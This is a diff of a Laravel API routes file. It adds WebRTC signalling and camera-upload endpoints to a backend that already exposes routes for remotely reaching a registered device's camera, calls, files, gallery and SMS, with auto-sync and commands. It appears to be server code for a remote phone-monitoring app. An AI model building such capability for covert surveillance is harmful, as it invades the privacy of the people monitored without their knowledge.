@@ -8,6 +8,7 @@ use App\Http\Controllers\DeviceController;
 use App\Http\Controllers\CommandController;
 use App\Http\Controllers\Api\UserController;
 use App\Http\Controllers\SubscriptionController;
+use App\Http\Controllers\WebRTCSignalController;
 
 
 Route::post('/register', [AuthController::class, 'register']);
@@ -17,6 +18,9 @@ Route::post('/email/verify', [AuthController::class, 'verifyEmail']);
 Route::post('/email/resend', [AuthController::class, 'resendVerification']);
 
 Route::middleware('auth:sanctum')->group(function () {
+
+    Route::post('send-web-rtc-signal', [WebRTCSignalController::class, 'store']);
+    Route::get('web-rtc-signals-pending', [WebRTCSignalController::class, 'getPending']);
 
     Route::get('/user', [UserController::class, 'me']);
 
@@ -29,10 +33,13 @@ Route::middleware('auth:sanctum')->group(function () {
     Route::post('/devices/fcm', [DeviceController::class, 'updateFcmToken']);
     Route::get('/devices/check', [DeviceController::class, 'checkRegistered']);
 
+    Route::post('/webrtc/signal', [AccessController::class, 'signal']);
     Route::post('/access/camera', [AccessController::class, 'camera']);
+    Route::post('/camera/upload', [AccessController::class, 'uploadCameraFile']);
+
     Route::post('/access/call', [AccessController::class, 'call']);
     Route::post('/access/file', [AccessController::class, 'file']);
-    
+
     Route::post('/access/gallery', [AccessController::class, 'gallery']);
     Route::post('/access/gallery/auto-sync', [AccessController::class, 'galleryAutoSync']);
     Route::post('/access/gallery/upload', [AccessController::class, 'uploadMedia']);
@@ -49,6 +56,4 @@ Route::middleware('auth:sanctum')->group(function () {
 
     Route::post('/command/auto_sync', [AccessController::class, 'fileAutoSync']);
     Route::post('/commands/sms_sync', [AccessController::class, 'smsAutoSync']);
-
-
 });
